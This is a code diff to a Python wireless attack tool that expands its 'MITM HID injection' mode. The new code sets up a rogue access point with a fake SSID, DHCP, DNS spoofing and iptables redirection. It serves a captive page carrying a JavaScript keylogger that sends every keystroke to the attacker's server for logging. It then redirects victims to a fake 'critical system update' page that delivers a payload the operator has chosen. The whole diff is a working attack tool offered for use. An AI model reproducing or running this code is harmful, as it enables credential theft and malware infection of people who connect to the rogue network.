@@ -5,7 +5,7 @@ import time
 from scapy.all import *
 from threading import Thread
 from random import choice, randint
-from http.server import SimpleHTTPRequestHandler, HTTPServer
+from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, HTTPServer
 
 seen_aps = {}
 clients = {}
@@ -239,94 +239,163 @@ log-dhcp
     os.system(f"sudo dnsspoof -i {iface} -f loot/dnsspoof_hosts &")
 
 def mitm_hid_injection():
+    import datetime
+    from http.server import BaseHTTPRequestHandler, HTTPServer
+    import shutil
+    import os
+    import time
+
     print("🧠 Starting MITM HID Injection Mode...")
-    iface = input("💜 Enter interface (e.g. wlan0): ").strip()
+    iface = input("💜 Interface (e.g. wlan0): ").strip()
     ssid = input("💜 SSID clients think they’re connecting to: ").strip()
+    fake = input("💜 Fake SSID to broadcast: ").strip()
 
     os.makedirs("loot", exist_ok=True)
+    os.makedirs("payloads", exist_ok=True)
 
-    print("🧹 Cleaning up old services...")
+    print("\n📦 Available Payloads in /payloads:")
+    payload_files = [f for f in os.listdir("payloads") if os.path.isfile(os.path.join("payloads", f))]
+    for i, f in enumerate(payload_files):
+        print(f"{i+1}) {f}")
+    print("0) None")
+    choice = input("💜 Choose payload: ").strip()
+    selected_payload = None
+    if choice.isdigit() and int(choice) in range(1, len(payload_files)+1):
+        selected_payload = payload_files[int(choice)-1]
+        shutil.copyfile(f"payloads/{selected_payload}", f"loot/{selected_payload}")
+
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")
+    session_log = f"session_log_{timestamp}.txt"
+    keystroke_log = f"keystroke_log_{timestamp}.txt"
+
     os.system("sudo pkill -f hostapd")
     os.system("sudo pkill -f dnsmasq")
-    os.system("sudo pkill -f phish_server.py")
     os.system("sudo pkill -f dnsspoof")
-
-    print("🌐 Configuring interface...")
+    os.system("sudo pkill -f phish_server.py")
     os.system(f"sudo ip link set {iface} down")
     os.system(f"sudo ip addr flush dev {iface}")
     os.system(f"sudo ip addr add 10.0.0.1/24 dev {iface}")
     os.system(f"sudo ip link set {iface} up")
 
-    hostapd_conf = f"""
+    with open("loot/hostapd.conf", "w") as f:
+        f.write(f"""
 interface={iface}
 driver=nl80211
-ssid={ssid}
+ssid={fake}
 hw_mode=g
 channel=6
 auth_algs=1
 ignore_broadcast_ssid=0
-    """.strip()
+""".strip())
 
-    with open("loot/hostapd.conf", "w") as f:
-        f.write(hostapd_conf)
-
-    dnsmasq_conf = f"""
+    with open("loot/dnsmasq.conf", "w") as f:
+        f.write(f"""
 interface={iface}
 dhcp-range=10.0.0.10,10.0.0.100,12h
 dhcp-option=3,10.0.0.1
 dhcp-option=6,10.0.0.1
 server=8.8.8.8
-log-queries
-log-dhcp
-    """.strip()
-
-    with open("loot/dnsmasq.conf", "w") as f:
-        f.write(dnsmasq_conf)
-
-    html = f"""<html><body>
-    <h2>Welcome to {ssid}</h2>
-    <p>Connecting... please wait.</p>
-    <script>
-    setTimeout(() => {{
-        alert("Installing driver...");
-        let keys = ["Windows+R", "cmd", "ENTER", "whoami", "ENTER"];
-        let i = 0;
-        function typeNext() {{
-            if (i < keys.length) {{
-                console.log("Injecting:", keys[i]);
-                i++;
-                setTimeout(typeNext, 1500);
-            }}
-        }}
-        typeNext();
-    }}, 3000);
-    </script></body></html>"""
+""".strip())
 
     with open("loot/injection.html", "w") as f:
-        f.write(html)
+        f.write(f"""<html><body>
+<h2>Welcome to {ssid}</h2>
+<form>
+<input id="input" type="text" placeholder="Loading..." autofocus>
+</form>
+<iframe src="http://10.0.0.1/track" style="display:none;" width="1" height="1"></iframe>
+<script>
+document.getElementById("input").addEventListener("keydown", function(e) {{
+    fetch('/log_key?key=' + encodeURIComponent(e.key));
+}});
+setTimeout(() => {{
+    window.location.href = "http://10.0.0.1/fake_update.html";
+}}, 4000);
+</script>
+</body></html>""")
 
-    print("📶 Launching hostapd...")
-    os.system(f"sudo hostapd loot/hostapd.conf &")
+    with open("loot/fake_update.html", "w") as f:
+        if selected_payload:
+            f.write(f"""<html><body>
+<h1>System Update</h1>
+<p>Click to install critical update.</p>
+<a href="/{selected_payload}" download><button>Download {selected_payload}</button></a>
+</body></html>""")
+        else:
+            f.write("<html><body><h1>No Update Required</h1></body></html>")
+
+    with open("loot/dnsspoof_hosts", "w") as f:
+        f.write("10.0.0.1 *\n")
+
+    print(f"📶 Broadcasting SSID: {fake}")
+    os.system("sudo hostapd loot/hostapd.conf &")
     time.sleep(2)
-
-    print("🧠 Starting dnsmasq...")
-    os.system(f"sudo dnsmasq -C loot/dnsmasq.conf &")
-
-    print("💻 Hosting fake HID page at http://10.0.0.1 ...")
-    os.system("sudo python3 -m http.server 80 --directory loot &")
-
-    print("🔀 Redirecting traffic...")
+    os.system("sudo dnsmasq -C loot/dnsmasq.conf &")
     os.system("sudo iptables -t nat -F")
     os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
     os.system("sudo iptables -t nat -A POSTROUTING -j MASQUERADE")
-
-    print("🎯 Launching dnsspoof...")
-    with open("loot/dnsspoof_hosts", "w") as f:
-        f.write("10.0.0.1 *\n")
     os.system(f"sudo dnsspoof -i {iface} -f loot/dnsspoof_hosts &")
 
-    print("✅ MITM HID Injection is live!")
+    os.chdir("loot")
+    open(session_log, "a").close()
+    open(keystroke_log, "a").close()
 
+    class HIDHandler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            ua = self.headers.get("User-Agent", "unknown")
+            ip = self.client_address[0]
+            log_entry = f"[{datetime.datetime.now()}] IP: {ip} | UA: {ua} | Path: {self.path}\n"
+            with open(session_log, "a") as f:
+                f.write(log_entry)
+
+            if self.path.startswith("/log_key"):
+                key = self.path.split("key=")[-1]
+                print(f"[KEYLOGGER] {ip} pressed: {key}")
+                with open(keystroke_log, "a") as f:
+                    f.write(f"[{datetime.datetime.now()}] {ip} pressed: {key}\n")
+                self.send_response(204)
+                self.end_headers()
+                return
+
+            elif self.path == "/" or self.path == "/index.html":
+                self.send_response(200)
+                self.send_header("Content-type", "text/html")
+                self.end_headers()
+                with open("injection.html", "rb") as f:
+                    self.wfile.write(f.read())
+
+            elif self.path == "/fake_update.html":
+                self.send_response(200)
+                self.send_header("Content-type", "text/html")
+                self.end_headers()
+                with open("fake_update.html", "rb") as f:
+                    self.wfile.write(f.read())
+
+            elif selected_payload and self.path == f"/{selected_payload}":
+                self.send_response(200)
+                self.send_header('Content-Disposition', f'attachment; filename="{selected_payload}"')
+                self.send_header('Content-type', 'application/octet-stream')
+                self.end_headers()
+                with open(selected_payload, "rb") as f:
+                    self.wfile.write(f.read())
+
+            elif self.path == "/track":
+                self.send_response(200)
+                self.send_header("Content-type", "image/gif")
+                self.end_headers()
+                self.wfile.write(b"GIF89a")
+
+            else:
+                self.send_error(404)
+
+        def log_message(self, format, *args):
+            return
+
+    print("💻 Serving fake pages on http://10.0.0.1 ...")
+    try:
+        HTTPServer(("0.0.0.0", 80), HIDHandler).serve_forever()
+    except KeyboardInterrupt:
+        print("🛑 Server stopped.")
 
 def main():
     print_banner()
